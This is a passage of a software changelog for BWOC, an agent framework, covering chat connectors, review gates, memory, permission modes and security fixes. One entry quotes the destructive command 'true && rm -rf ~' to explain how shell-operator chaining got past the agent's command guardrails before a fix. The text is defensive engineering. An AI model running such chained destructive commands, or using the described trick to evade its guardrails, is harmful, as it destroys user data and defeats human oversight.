- **Chat connectors — `bwoc status` connector health.** `bwoc-agent --serve` now writes a `.bwoc/connector.status` marker (platform · state `running`/`exited`/`stopped` · pid) as it supervises a connector, and `bwoc status` surfaces it in a new **Connectors** section (e.g. `agent-pi  telegram  running (pid 1234)`). Fleet-visible connector health without disturbing the agent table; best-effort, no new dep (serde_json marker).

- **Chat connectors — hardening (post-PR4 review follow-ups).** Discord gateway: the first heartbeat now waits ~half the interval (`interval_at`) instead of firing immediately after IDENTIFY (off-spec), and `createMessage` failures include Discord's JSON error body. Group peer context is now tagged platform-aware (`dc:<id>` / `tg:<id>`) via `GroupBridge.peer_prefix` rather than a hard-coded `tg:`. `futures-util` enables `std` (it uses `StreamExt`), and the `NoToken` message no longer references the obsolete PR3. Remaining connector follow-ups: keyring token resolution, `bwoc status` connector health, gateway RESUME.

- **Chat connectors — Discord (PR4), completing the Telegram/Discord subsystem.** `bwoc-connect discord --agent <dir>` bridges Discord to a BWOC agent over the **Gateway websocket** (HELLO → IDENTIFY → heartbeat → `MESSAGE_CREATE` dispatch; intents `GUILD_MESSAGES|DIRECT_MESSAGES|MESSAGE_CONTENT`) with REST sends, reconnecting on drop. The routing/allow-list/group-vs-DM logic (`run_bridge`) is **reused unchanged** — only a new `DiscordTransport` (a background gateway task feeding a queue that `poll` drains) and the pure `parse_message_create` are Discord-specific. DMs vs guild rooms split on `guild_id`; mention-gating uses Discord's structured `mentions[]`; bot authors are skipped (no loops). Token from `DISCORD_BOT_TOKEN`; `bwoc-agent --serve` now supervises `connectors/discord.toml` too. Dep-quarantine holds: `tokio-tungstenite` lives only in `bwoc-connect` (verified absent from cli/agent/core). `parse_message_create` is unit-tested (DM / guild±mention / bot-author+empty skip); the gateway loop is the integration-untested live edge (no Discord token in CI). Telegram + Discord, DM + group, now both daemon-managed.

- **Chat connectors — daemon supervision (PR3).** `bwoc-agent --serve` now supervises an agent's connector: when `connectors/telegram.toml` has `enabled = true`, the daemon spawns `bwoc-connect telegram --agent <dir>`, respawns it on exit (5s backoff so a crash-loop can't spin hot), and kills it on shutdown — the same subprocess-supervision pattern as `bwoc-harness`, so the **dep-quarantine holds** (bwoc-agent gains only lean `toml`; reqwest/tokio stay inside `bwoc-connect`, verified). Detection + the enabled-flag read are unit-tested (enabled / disabled / absent / malformed). Keyring token resolution + `bwoc status` connector health are the remaining PR3 follow-ups; Discord is PR4.

- **Chat connectors — Telegram group ⇄ Saṅgha team chat (PR2).** Group/supergroup rooms now bridge to a team's shared `chat.jsonl` (HV3-3a). A `[group] team = "<id>"` binding in `telegram.toml` routes group messages from allow-listed senders: a message that **@mentions the bot** (or any message when `mention_only = false`) is served by a `--team-chat` agent session — which injects the room's recent peer messages and broadcasts its reply — and the reply goes back to the room; a **non-mention** message is appended to `chat.jsonl` as peer context (`from = "tg:<user>"`) so the agent has the conversation when next addressed. A group message with no team binding is ignored; the allow-list still gates who may reach the agent. The bot's `@username` is resolved via `getMe` at startup for mention-gating. 12 unit tests (DM/group classification, mention detection, mention→reply, non-mention→peer-log-no-reply, no-binding→ignored) behind the same `Transport`/`AgentSession` seams. Next: daemon supervision + keyring (PR3), Discord (PR4).

- **Chat connectors — `bwoc-connect`, Telegram DM (PR1 of the connector subsystem).** A new **dep-quarantined** crate (`reqwest`/`tokio` live here; `bwoc-cli`/`agent`/`core` trees stay clean — verified) that bridges external chat platforms to BWOC agents. `bwoc-connect telegram --agent <dir>` long-polls Telegram and, for each **allow-listed** sender, holds a `bwoc-harness --chat` subprocess and relays text both ways over the existing `bwoc_core::chat_proto` — so streaming/permission/compaction come free, no protocol invention. **Security-first**: a *closed-by-default* sender allow-list (empty ⇒ nobody — no public bots); the bridged session is non-TTY so `ask`-mode tools fail safe to **deny**, and a `PermissionRequest` is auto-denied (a remote user can never approve a tool call). The routing/allow-list/offset core (`run_bridge`) and the Telegram update parser are unit-tested behind `Transport`/`AgentSession` seams (no live bot needed). Token from `TELEGRAM_BOT_TOKEN` (the headless-server path); keyring resolution + daemon supervision + group rooms (HV3-3a `chat.jsonl`) + Discord follow in PR2–PR4 (design: `notes/2026-06-06_chat-connectors-design.md`).

- **`bwoc report` — file a GitHub issue from the CLI.** `bwoc report "<title>" [--body …] [--kind bug|feature|question] [--web] [--yes]` previews the issue and, after an explicit confirmation on an interactive terminal, creates it via `gh issue create` against the framework repo. **Fail-safe by construction**: unattended sessions (non-TTY without `--yes`), `--web`, or a missing/unauthenticated `gh` all fall back to printing a prefilled `issues/new` URL — a public issue is never filed unattended. The body always carries an Environment block (bwoc version, release identity, OS/arch) so reports are diagnosable in one round; `--kind feature` maps to the stock `enhancement` label. Shells out through the same `ShellRunner` seam as `bwoc update` (no new HTTP dependency; fully unit-tested with a mock, including the RFC 3986 percent-encoder for the query-string values).

- **GitHub Copilot CLI is the 6th backend (`copilot`) — Samānattatā.** `bwoc spawn`/`bwoc chat` exec the `copilot` agentic CLI in the agent's directory (it reads `AGENTS.md` natively, so the backend-neutral source of truth works unmodified; a `COPILOT.md → AGENTS.md` symlink joins the template set for convention). **`bwoc run` works headless too** — `copilot -p "<task>" --no-ask-user` (Copilot's programmatic mode; the permissive `--allow-all-tools` is deliberately not passed, matching GitHub's container-only guidance and our fail-safe posture) — making Copilot the second vendor backend with non-interactive support after Claude, a head start on HV3-6. Wired through `parse_backend` (chat/run), the `bwoc new` model picker (multi-model menu: Claude + GPT slugs), `bwoc doctor`'s PATH probe, `bwoc help backends`, the handbook (EN/TH), and `WORKSPACE` docs (EN/TH). No `reasoningEffort` flag (Copilot exposes none).

- **HV3-3c — peer-review gate (Kalyāṇamitta).** Completes HV3-3: a Saṅgha lead can route a successful worker's diff to a designated reviewer agent before completing the task. `bwoc-core::team::Team` gains a `reviewer` field (decided shape: **fixed reviewer per team**); new `bwoc-harness::review` defines a `Reviewer` trait + `ReviewVerdict` + a pure `parse_verdict` + `SubprocessReviewer` (spawns a `bwoc-harness` in the worker's worktree to inspect the diff, reads the verdict from the HV3-3b result envelope). The lead's success path now gates on it: **APPROVE** → complete + tear down; **REJECT** → unclaim (re-queue) keeping the worktree + feedback for the next claimer, counted in a new `LeadSummary.rejected`. Wired via `bwoc-harness --lead --reviewer <agent>`; a reviewer equal to the claiming agent (self-review) is skipped, and the gate is **fail-safe** — a reviewer spawn/timeout/unparseable-verdict resolves to REJECT, so unreviewed work never auto-completes (Sīla). CLI resolution of the team's `reviewer` field into `--reviewer` is a follow-up slice.
- **`bwoc handbook` — bundled offline quick guide.** A new command rendering a terminal-sized, task-oriented guide straight from the binary (no network, no files to locate). `bwoc handbook` lists sections; `bwoc handbook <section>` prints one — **start · agents · spawn · teams · harness · release**. Bilingual: the resolved language (`--lang` / `BWOC_LANG` / `LANG`) selects the Thai body, falling back to English. Content is purpose-written for getting moving; the full reference stays in `docs/`.
- **`bwoc info` — one-card system status.** Version + release identity (CalVer when a release build) + phase + workspace path + registered-agent count + update-drift status, in one card (`--json` for the machine-readable form). The update line is **read-only and offline** — it reuses the throttle cache the background version-check already maintains (no extra network), surfacing explicitly what bare `bwoc` already prints as a drift notice. New `update::info_status_line()` exposes that cached status.

## [v2026.6.6-0] — 2026-06-06 — 2.24.0

### Added

- **HV3-3a — team chat broadcast (Kalyāṇamitta).** Agents in a Saṅgha team can now see each other's chat replies through a shared append-only log. `bwoc-core::team` gains `TeamChatMessage` + `parse_chat`/`render_chat` — one JSON object per line in `.bwoc/teams/<team-id>/chat.jsonl`, the same storage model as the task list (no pub/sub, no broker). A `bwoc-harness --chat --team-chat <path>` session opts in: teammate messages posted since the last turn are injected as a "Team conversation (Saṅgha)" system note before each user turn, and the agent's reply is appended to the log afterward (append-mode, so concurrent teammates never clobber each other). Strictly opt-in and best-effort: no `--team-chat` keeps the session solo (zero behaviour change), a missing/unparseable log injects nothing, an agent never sees its own messages echoed back, and the cursor resyncs if the log is rotated/rewritten shorter (append is a single `O_APPEND write_all`). Reachable from the CLI as **`bwoc chat <agent> --tui --team <id>`**: it validates the agent's team membership, resolves `.bwoc/teams/<id>/chat.jsonl`, and forwards it to the harness (warn-and-run-solo if `--team` is given without a harness-backed `--tui` session, since vendor CLIs speak their own protocol). Teammate messages are also surfaced to the frontend: the harness emits a new `ChatEvent::TeamMessage { from, text, ts }` (additive, forward-compatible) for each previously-unseen peer message, and the `--tui` client renders it distinctly (`📢 <from>: <text>`) so the human follows the team thread, not only the agent's replies.

- **HV3-3b — worker result envelope (Kalyāṇamitta).** A Saṅgha worker now leaves a structured outcome in its worktree instead of only an exit code: at session end `bwoc-harness` writes `.bwoc/worker-result.json` (`bwoc_harness::result::WorkerResult` — task, success, turns, compactions, token-pressure switches, active model, a bounded summary, and a `DiffSummary` of working-tree changes vs the base `HEAD`, untracked files included). The lead reads it before tearing the worktree down and logs a one-line summary (`N turn(s), +X/-Y across F file(s), model=…`). Best-effort and backward-compatible: a worker that writes no envelope degrades silently to the exit code the lead already has. This is the seam HV3-3c's peer-review gate will tap — the reviewer reads the same envelope before gates run.

- **HV3-2 — unified context engine.** Batch and `--chat` now share one compaction policy (`compact::compact_context`): **summarize-first** (the oldest span folds into one LLM summary note) with a **truncate-with-marker fallback** when the summarizer fails — so the batch loop gains real summarization (it was truncate-only by v1 design) and chat gains the guaranteed-shrink fallback (a failing summarizer no longer leaves the history over budget), with no new failure mode in either path. **Tier 2 synergy:** what falls out of the window falls into memory — when `deepMemoryCmd` is configured the folded content (summary, or raw excerpt on fallback) is written to `.bwoc/compacted-context.md` and mined (`--mode compaction`), recallable later via `memory_search`. The loop's `compactions` metric now counts only passes that actually folded messages (previously a triggered no-op also incremented).

- **Harness v3 begins — HV3-1 "Memory in the loop" (Sati).** When the agent's manifest configures `deepMemoryCmd`, `bwoc-harness` closes the Tier 2 memory loop around every session: **wake-up** output joins the system prompt at session start (batch *and* `--chat`) as a "Prior context (Tier 2 memory)" block; a read-only **`memory_search`** tool (`<cmd> search`) lets the model recall past decisions mid-run through the normal guardrails → permission pipeline (chat's default policy allows it beside `memory_read`); and at session end the session is **mined** back into memory — chat mines its persisted `.bwoc/chat-session.json`, a successful batch run distils *task → outcome* into `.bwoc/last-run.md` and mines that (the checkpoint is cleaned up on success), and a failed run mines its surviving checkpoint. Strictly opt-in and best-effort: absent/placeholder `deepMemoryCmd` disables everything, failures degrade to warnings, and every call is timeout-bounded (10/15/60 s) so a hung backend can never stall a run. Verified live end-to-end: run 1 mined its distillate, run 2 woke with run 1's memory injected.

## [v2026.6.5-0] — 2026-06-05 — 2.23.0

### Added

- **Windows named-pipe daemon — `bwoc-agent --serve` now runs on Windows.** Replaces the exit-2 stub with a real daemon over a named pipe at `\\.\pipe\bwoc-agent-<hash>`, where the hash derives deterministically from the agent directory (`bwoc-core::ipc::pipe_name`, dependency-free FNV-1a) so server and clients meet without a rendezvous; the name is also recorded in `.bwoc/agent.pipe` for humans and `doctor`. The daemon body (`serve_core`) is now transport-independent — PID file, inbox watch + cursor, trust gating, Saṅgha task watch, and the line-text protocol (`PING`/`STATUS`/`STOP`) are one shared implementation; Unix keeps its exact `agent.sock` contract (still `nc -U`-debuggable). Clients gained Windows paths: `bwoc ping` / `status` (uptime) / `stop` speak the pipe; process liveness and the stop escalation use `tasklist` / `taskkill` (polite, then `/F`) — no new always-on deps (`interprocess` is `cfg(windows)`-only; dep-quarantine intact, `bwoc-core` untouched). A named-pipe protocol roundtrip test runs on the windows-latest CI leg. Closes the last code item under Phase 2 "Remaining for ship".

### Fixed

- **`bwoc new` now honours the standard workspace resolution for its default target.** Previously only the ancestor walk from *cwd* ran, so `BWOC_WORKSPACE=/scratch/ws bwoc new …` silently created and registered the agent in whatever workspace enclosed the current directory — e.g. the live fleet instead of the scratch one. The default target now resolves per WORKSPACE.en.md precedence: the new `--workspace <path>` flag > `BWOC_WORKSPACE` env > ancestor walk. An explicit `--target` still wins outright.

## [v2026.6.4-0] — 2026-06-04 — 2.22.0

### Added

- **Design system — `bwoc-core::design` tokens.** A single source of truth for the colours, glyphs, and spacing BWOC's three UIs render with (`bwoc dashboard`, `bwoc chat --tui`, the `bwoc-chat` desktop app), replacing per-UI hardcoded palettes that had drifted. Tokens are **plain data** (no ratatui/egui types — dep-quarantine intact): each `ColorToken` carries an `ansi` half (terminal UIs map it to *named* colours so the user's terminal theme keeps authority) and an `rgb` half (pixel UIs use it directly); glyphs are shared `&str`; spacing/typography are plain `f32` (`MESSAGE_GAP`, `LINE_HEIGHT_FACTOR` 1.4 for stacked Thai marks). Principles enforced by unit tests: activity glyphs pairwise distinct (state never reads by colour alone), selection hue ≠ idle/title hue (one meaning per colour per screen), muted floors at `Gray` (never `DarkGray`-on-dark). **Both framework TUIs now consume the tokens** — `bwoc dashboard` (incl. review fixes: selection moves from yellow to blue/white so yellow no longer means title+selection+idle at once; the navigable agents pane gets the accent border; muted text lifted from `DarkGray` to `Gray`) and `bwoc chat --tui` (status bar, borders, permission/outcome colours). Spec: `docs/en/DESIGN.en.md` (+ TH). The `bwoc-chat` desktop app (separate repo) is a follow-up.
- **`bwoc remote` — link agents to remote-control sessions and manage them.** A *remote-control session* lets an agent's interactive session be driven from elsewhere (e.g. Claude Code's Remote Control, reachable from claude.ai / mobile); `bwoc remote` is **backend-neutral bookkeeping** over that relationship — it records which external control session each agent is linked to, without opening or proxying the session itself. `bwoc remote link <agent> <session-ref>` writes a record at `.bwoc/remote/<agentId>.json` (`{ agentId, backend, kind, sessionRef, url?, linkedAt, note? }`, mirroring the `.bwoc/sessions/` marker convention); `--backend` defaults from the workspace registry (`agents.toml`) and `--kind` defaults to `claude-remote-control` (the first mechanism — any backend may declare its own `kind`, so Claude is the first implementation, not a special case). `bwoc remote list` / `status <agent>` read (`--json`; `list` flags orphaned links whose agent is no longer registered); `bwoc remote unlink <agent>` is a gated remove (TTY confirm unless `--yes`).

### Fixed

- **`bwoc dashboard` banner no longer clips its attention indicator.** The workspace line renders un-wrapped, so a long workspace path pushed the rightmost — most important — parts (`attention: N pending`, the counts) off-screen. The path now elides its *middle* against the pane width (the tail keeps the directory name); the counts and attention always render.
- **`bwoc dashboard` TUI UX (P1s from the design review).** (1) The footer hotkey legend — one un-wrappable row — clipped its rightmost hints (incl. `q/Esc`) on narrow terminals, worse with longer i18n labels (e.g. Thai); below 100 cols it now falls back to a core legend (`↑↓ · t · ? · q`) with `?` carrying the full list. (2) The `?` help overlay (fixed 60% height) clipped its bottom lines on short terminals; it is now sized to its content (+ wrapped), centred and clamped. (3) Below 60×16 the bordered panes collapsed into garbage; a centred "terminal too small" hint renders instead. (4) a11y: `working` and `running` no longer share the `●` glyph — `working` is `◉`, so activity states read without relying on colour.

## [v2026.6.3-1] — 2026-06-03 — 2.21.0

### Added

- **New `bwoc-deep-memory` crate — the Tier 2 deep-memory reference implementation.** A self-contained binary that speaks the backend-neutral `bwoc-core::deep_memory` contract (`wake-up` | `search "<q>"` | `mine <path> --mode <m>`) over a local SQLite store with **semantic (embedding) recall**, so a fresh `bwoc new --deep-memory-cmd bwoc-deep-memory …` works out of the box instead of pointing at a tool the operator must supply. `mine` walks session files (`md/txt/jsonl/json/log`, 5 MiB/file cap), chunks at paragraph boundaries, embeds via any OpenAI-compatible `POST /v1/embeddings` endpoint (Ollama/llama.cpp/vLLM/OpenAI), and stores `f32` vectors as BLOBs; `search` ranks by **brute-force cosine** in Rust (no native-extension build risk — a `sqlite-vec` k-NN backend can swap in later behind the unchanged `Store` seam); `wake-up` emits the most-recent memories for session-start injection. The `Embedder` trait is injectable — a deterministic `StubEmbedder` keeps the verb logic unit-tested offline, mirroring the existing `RunnerFn` seam. Dep-quarantine preserved: `rusqlite` (`bundled`) + `reqwest` live only in this crate, never `bwoc-core`. **Closes the last item deferred off the Phase 3 DoD** (the interface — `bwoc-core::deep_memory` + the `bwoc memory wake-up|search|mine` CLI surface — already shipped; this is the reference backend it dispatches to). Config: `--db`/`--embed-url`/`--embed-model` flags > `BWOC_DEEP_MEMORY_DB`/`BWOC_EMBED_URL`/`BWOC_EMBED_MODEL`/`BWOC_EMBED_API_KEY` env > defaults.
- **`bwoc debase` — manage the agent → base-project binding as a first-class surface.** An agent's *base project* (the one it derives from and builds) is carried functionally by its manifest `worktreeBase`: an agent bound to project `P` has `worktreeBase = <P>/worktrees`, and the framework places task worktrees at `<worktreeBase>/<agentId>/<taskId>`. The new command makes that relationship inspectable and editable: `bwoc debase list` (every agent → base project + buildable stack, `--json`), `bwoc debase show <agent>` (one agent's binding detail incl. the worktree pattern), and `bwoc debase set <agent> <project>` (a gated write — TTY confirm unless `--yes` — that points the agent's `worktreeBase` at `<project>/worktrees`; idempotent, canonicalizes the path, refuses a non-existent project). Unbound agents (no `worktreeBase` — e.g. monitoring/audit agents that operate *on* targets) show as `—`.
- **`bwoc new --project <path>` — derive an agent already bound to a project.** Incarnates the agent and, in one step, sets `worktreeBase` to `<project>/worktrees` and seeds the build/test/lint/format gates from the project's detected stack (Rust/Node/Python/Go). Explicit gate flags (`--lint-cmd` etc.) and `--worktree-base` always win over the derived defaults. Pairs with `bwoc debase` for the lifecycle of the binding.

## [v2026.6.3-0] — 2026-06-03 — 2.20.1

### Added

- **Cross-backend validation workflow (`.github/workflows/cross-backend.yml`).** Proves Samānattatā by running one agent profile through the full uppāda → ṭhiti arc (`bwoc init` → `bwoc new` → `bwoc check` → `bwoc run`) on the **ollama** backend — the one needing no API key (installs Ollama + a tiny model, `qwen2.5:0.5b`, in the runner). Runs on push-to-main + nightly + manual dispatch — not on every PR (the fast gate in `ci.yml` stays the PR gate), since model pulls are slow. Closes the "Cross-backend validation" item under Phase 2 "Remaining for ship" for the ollama backend; the four vendor backends (claude / codex / kimi / antigravity) are a documented follow-up, gated on operator-provisioned API-key secrets.
- **Cross-backend validation now also covers the `claude` backend** (it runs through `bwoc-harness` like ollama). A second job in `cross-backend.yml` runs the same uppāda → ṭhiti arc with `--backend claude` (Sonnet), gated on an `ANTHROPIC_API_KEY` secret — the job no-ops with a warning when the secret is absent (free until an operator provisions it), and the secret is referenced statically (no dynamic indexing) to satisfy CodeQL. The remaining vendor backends (codex / kimi / antigravity) are vendor-CLI execs, not harness/API-key, so their CI coverage needs the vendor CLI installed + authenticated — a separate follow-up.

### Security

- **`bwoc init` now gitignores the Trust v2 agent signing private key.** The `.gitignore` template gained `agents/*/.bwoc/agent.key` — the ed25519 **private** key `bwoc trust --keygen` writes (mode `0600` on Unix; non-Unix sets no perm restriction). User workspaces track `agents/` (only daemon ephemerals were ignored), so without this pattern a `git add -A` after keygen would commit an agent's private identity key. The matching **public** key (manifest `trust.signingPublicKey`) stays tracked, as intended. The pattern lives in the shared tail, so it applies under `--no-runtime` too. (Sīla — Adinnādāna.)

## [v2026.6.1-1] — 2026-06-01 — 2.20.0

### Added

- **`bwoc send` publishes over MQTT for `transport = "mqtt"` routes.** When a recipient resolves to a `RouteTarget::Mqtt` route, `bwoc send` (and `bwoc peer`) now build + sign the envelope as usual and publish it via the `bwoc-mqtt` sibling binary (`bwoc-mqtt publish`) instead of writing a local inbox — completing cross-machine delivery: sender → broker → the peer's `bwoc-mqtt serve` → recipient `inbox.jsonl`. Local-FS routes are unchanged. Dep-quarantine preserved: `bwoc-cli` spawns `bwoc-mqtt` rather than linking an MQTT client.
- **New `bwoc-mqtt` crate — MQTT transport for inter-workspace routing.** `bwoc-mqtt publish` pushes one envelope (the same JSON line `bwoc send` writes) to a broker topic; `bwoc-mqtt serve` subscribes (default `bwoc/+/inbox`) and appends each received envelope to the matching agent's `inbox.jsonl`, resolved via the local `AgentsRegistry` — so MQTT delivery and local-FS delivery produce identical inbox lines. Pure helpers (broker parse, topic derivation, recipient extraction, inbox resolution) are unit-tested; the `rumqttc` I/O is verified end-to-end against a live broker. Dep-quarantined: only `bwoc-mqtt` links an MQTT client.
- **Routing tables gain an MQTT transport target.** A `[[route]]` in `.bwoc/interconnect/routes.toml` now declares `transport = "local"` (default — a peer `workspace` path, unchanged) or `transport = "mqtt"` (a `broker` URL + optional `topic`, defaulting to `bwoc/<recipient-id>/inbox`) for cross-machine federation. `bwoc-core` stays MQTT-dependency-free — routes carry plain strings; `Routes::resolve_target` surfaces the `RouteTarget` and the publish lives in the forthcoming `bwoc-mqtt` crate. Pre-MQTT routes (just `workspace`) keep their exact meaning.
- **Native Anthropic (Claude) provider in `bwoc-harness`.** A second `ProviderClient` (`AnthropicClient`) speaks the Anthropic Messages API (`POST /v1/messages`), translated into the same OpenAI-shaped `provider::types` so the chat/agent loops, tool dispatch, and streaming accumulators are unchanged. `claude`-backend agents now run through the harness and emit the `chat_proto` stream (so `bwoc-chat` can render a native window for them). A new `--backend` flag (default `ollama`) selects the provider via a `build_provider()` factory; for `claude`/`anthropic` with the endpoint left at the Ollama default, it substitutes `https://api.anthropic.com`. Auth via `ANTHROPIC_API_KEY`, falling back to `~/.bwoc/secrets.toml` (`[anthropic] api_key`, 0600) so a GUI-launched `bwoc-chat` works without an exported env. Translation covers request mapping (system lift, `tool_use`, merged `tool_result` turns, `input_schema`), response parsing, and typed SSE streaming with usage stitching.
- **Automatic context compaction in `--chat`.** When the conversation's estimated size crosses the session's `max_context_tokens` budget, the oldest turns are summarized (one provider call) into a single note before the next request, keeping the recent tail verbatim — so a long chat stays under the model's window without losing earlier decisions. The harness emits a `chat_proto::ChatEvent::Compacted { removed }` notice; a summarizer failure is non-fatal (the turn proceeds uncompacted). The split never starts the kept tail on an orphan tool result. Adapted from openclaude's `autoCompact`.
- **Plan mode in `--chat`.** A fourth permission mode (`SetMode "plan"`): only read-only tools (`read_file` / `list_dir` / `grep` / `memory_read`) run; **every other tool** — writes, shell, `git`, task/peer/run delegation, gates, memory writes, and any future tool — is refused before the permission gate (allow-list, not deny-list) with a note telling the model to present its plan instead of acting. Switch back to `default` / `accept_edits` / `bypass` to execute. Adapted from openclaude's plan mode; reuses the existing `SetMode` / `ModeChanged` wire.
- **Live permission modes in `--chat`.** A new `chat_proto::ChatInput::SetMode` switches the session's permission posture without restarting: `default` (prompt for every `ask`-mode tool), `accept_edits` (auto-approve file write/edit tools, still prompt for the rest), or `bypass` (auto-approve every `ask`-mode tool). The harness acks with `ChatEvent::ModeChanged`. Hard `deny` rules and guardrails are never relaxed — modes only turn `ask` into auto-allow. Adapted from openclaude's permission modes; additive + backward-compatible.
- **`bwoc-harness --unrestricted` lifts the workdir file-access sandbox.** With the flag, the file tools (`read_file`/`write_file`/`edit_file`/`list_dir`/`grep`) may touch **any absolute path** on the machine; relative paths still resolve against `--workdir`. Without it, the path-traversal confinement is unchanged (the safe default). The safety gate shifts to the permission policy, so this is meant for an `ask`-gated / operator-reviewed session. `bwoc-chat` (desktop) passes `--unrestricted` so a chat agent can read & edit your real project files, with each write/edit surfaced as an Allow/Deny prompt.
- **`--chat` defaults to an `ask` permission policy** when the workdir has no `.bwoc/harness-policy.toml` (instead of the batch path's fail-safe deny): read-only tools run freely, while writes/edits/`run_command`/`git` prompt the frontend. An interactive client is always present in chat to answer, so file editing works out of the box without hand-writing a policy.
- **The `bwoc-harness --chat` session now remembers conversations.** The conversation is persisted to `<workdir>/.bwoc/chat-session.json` after each turn and reloaded on the next launch, so the **agent keeps full context across restarts** (not just a display transcript). On connect the prior turns are replayed to the frontend via a new `chat_proto::ChatEvent::Restored { role, text }`; a new `ChatInput::Forget` clears the memory (history + file). Both additions are backward-compatible (additive variants).
- **The `bwoc-harness --chat` driver now streams token deltas.** Each assistant turn is generated via the provider's streaming API and emitted as `chat_proto` `Token` events as the tokens arrive (followed by the final `Message`), so frontends — `bwoc chat --tui` and the `bwoc-chat` desktop app — render the reply live instead of all-at-once. Tool calls + the interactive permission round-trip are unchanged.
- **The `chat_proto` `Ready` event now carries the agent's tool names** (`tools: Vec<String>`, `#[serde(default)]` for backward compatibility), so a frontend can show what the agent can do (e.g. a `/tools` command).

### Changed

- **`edit_file` now falls back to whitespace-tolerant matching.** When an exact `old_string` match fails, the tool matches the file line-by-line ignoring each line's leading/trailing whitespace, and re-indents `new_string` to the file's actual indentation. This rescues the most common small-model edit failure — an `old_string` whose indentation is slightly off — while still refusing an ambiguous multi-site match (asks for more context instead of guessing). The result message reports which strategy matched (`exact` / `whitespace-tolerant`). Pattern adapted from openclaude's `FileEditTool`.

### Fixed

- **Restored: the chat driver emits `TurnEnd` on every error path.** A frontend treats `TurnEnd` as the per-turn "ready for next input" delimiter; the provider-error / empty-response paths had regressed to returning without it (a #160 review fix lost during the parallel-build integration). Re-added the `emit_turn_end` helper + calls alongside the streaming rewrite.

## [v2026.6.1-0] — 2026-06-01 — 2.19.0

**Minor release.** Agentic chat TUI + cross-agent delegation, with hardening and a crate split. Headline: `bwoc chat --tui` — a full-screen ratatui chat for the ollama / openai-compatible backends with interactive permission prompts — and the `bwoc_run` tool, letting a model launch another BWOC agent. Plus shell-operator-aware `run_command` guardrails, a provider request timeout, lead→worker budget/vetting propagation, and the audit-plugin environment scrub. Cargo SemVer `2.18.1` → `2.19.0`.

### Added

- **`bwoc chat <agent> --tui` — full-screen agentic chat TUI** for the ollama / openai-compatible backends. A ratatui client (status / conversation / tools-activity / input panes) drives a `bwoc-harness --chat` subprocess over a new JSON-line protocol (`bwoc_core::chat_proto`: `ChatEvent` out, `ChatInput` in) and renders streaming turns, tool calls, and interactive `[a]llow?`/`[d]eny` permission prompts. Vendor-CLI backends (claude / codex / kimi / agy) print a hint and fall back to the default exec path. The renderer lives in its own **`bwoc-tui`** crate (depends only on `bwoc-core` + ratatui/crossterm — never on `bwoc-harness` or `bwoc-cli`, preserving the dep-quarantine; the harness is a runtime subprocess, resolved as a sibling of the running `bwoc`).
- **`bwoc_run` harness tool — "ollama launches bwoc".** The model running a `bwoc-harness` loop (the ollama / openai-compatible backends) can now delegate a self-contained subtask to *another* BWOC agent by calling the `bwoc_run` tool, which shells out to `bwoc run <agent> --task <task> --json --timeout <n>` and returns the captured result. Like every tool it is **denied by default** (the permission policy's fail-safe `default_mode`), so it only fires when an operator opts in via `.bwoc/harness-policy.toml`; that same gate bounds recursion (a delegate can re-launch only if its own policy allows it), and each launch is time-bounded (`timeout_secs`, default 300).

### Changed

- **Lead mode forwards budget/vetting flags to its Saṅgha workers.** `bwoc-harness --lead` now propagates `--token-budget` / `--cost-limit` / `--cost-per-1m` / `--vetted-mode` to each spawned worker (previously silently dropped), so a budget or vetting policy set on the lead governs its workers too. The worker argv is built as `OsString` end-to-end so a non-UTF8 worktree path is passed verbatim.

### Fixed

- **`run_command` guardrails are shell-operator-aware.** The destruction / gate-bypass / privilege-escalation checks keyed off the first whitespace token, but the verbatim command runs via `sh -c`, so `true && rm -rf ~` slipped its destructive second segment past them. The command is now split on `;` `&&` `||` `|` and each segment gets the existing checks (an operator-level split, not a full POSIX parser — quoting / substitution remain the OS sandbox's job). The splitter compares ASCII operator bytes directly, so it can't panic on non-ASCII input.
- **The provider HTTP client now has a request timeout (120s).** A hung completion previously never resolved and bypassed the retry/backoff/budget path; it now surfaces as a transient error the existing retry loop handles.

### Security

- **Audit plugins no longer inherit the operator's environment.** `bwoc audit run` spawns each audit plugin — third-party code installed from a git/tarball URL — and the spawn carried the full ambient environment, leaking `GITHUB_TOKEN` / `AWS_*` / `NPM_TOKEN` etc. to exactly the process whose job is to run code you don't yet trust. The spawn now starts from a scrubbed environment (`env_clear()` + an allowlist filter) plus only the three `BWOC_*` context vars. The scrub logic + allowlist moved to a shared `bwoc_core::env_scrub` so the audit runner and the harness sandbox enforce the identical rule (the harness `sandbox::scrub_env` re-exports it; no new crate dependency — `bwoc-cli` already depends on `bwoc-core`, and the dep-quarantine on `bwoc-harness` is preserved).

## [v2026.5.31-4] — 2026-05-31 — 2.18.1

**Patch release.** Binary-resolution correctness: every place a BWOC binary launches another now runs the binary actually installed alongside it, not whatever stale copy is first on `$PATH` (dev builds, side-by-side version installs). Plus two internal de-duplications of drift-prone constants. Cargo SemVer `2.18.0` → `2.18.1`.

### Fixed

- **`bwoc chat --tmux` (and the dashboard's `t`/`g`/`l`/`i`/start/stop shell-outs) now re-invoke the *running* `bwoc` binary instead of a bare `bwoc` PATH lookup.** The tmux window / Ghostty window / captured child launched whatever `bwoc` was first on `$PATH`, so a dev build or a non-PATH install silently spawned a *different, stale* binary (e.g. a 2.18 build opening a 2.11 install) — or, with no `bwoc` on `$PATH` at all, the window flashed "command not found" and vanished. All these launchers now resolve `std::env::current_exe()` (new `spawn::bwoc_exe()` helper, mirroring `harness_binary`'s sibling-of-the-running-binary rule), falling back to `"bwoc"` only when `current_exe()` is unavailable.
- **Every BWOC binary that re-invokes a *sibling* binary now resolves it relative to the running executable, via the shared `bwoc_core::exec::{sibling_binary, binary_or_name}` helper.** Previously `bwoc start` / `bwoc supervise` spawned the daemon as a bare `bwoc-agent`, and the harness/agent shelled out to a bare `bwoc` (`task`, `send`, auto-claim) — each a `$PATH` lookup that could hit a different, stale version than the one running. The three-tier rule (sibling-of-`current_exe` → `CARGO_BIN_EXE_<name>` → `$PATH`, including Windows `<name>.exe` siblings) is now defined once in `bwoc-core` and reused; `spawn::harness_binary` was de-duplicated onto it.

### Changed

- **Single source of truth for two drift-prone constants.** The default Ollama endpoint (`http://localhost:11434/v1`) was hardcoded in four places across `bwoc-harness` — now one `provider::client::DEFAULT_ENDPOINT`. The `evidence.kind` enum (`EVIDENCE_KINDS`) was duplicated verbatim in `check.rs` and `audit.rs` — now one `pub(crate)` const in `check`. The startup banner's backend list also gained the missing `openai-compatible` so it matches the six backends documented elsewhere.

## [v2026.5.31-3] — 2026-05-31 — 2.18.0

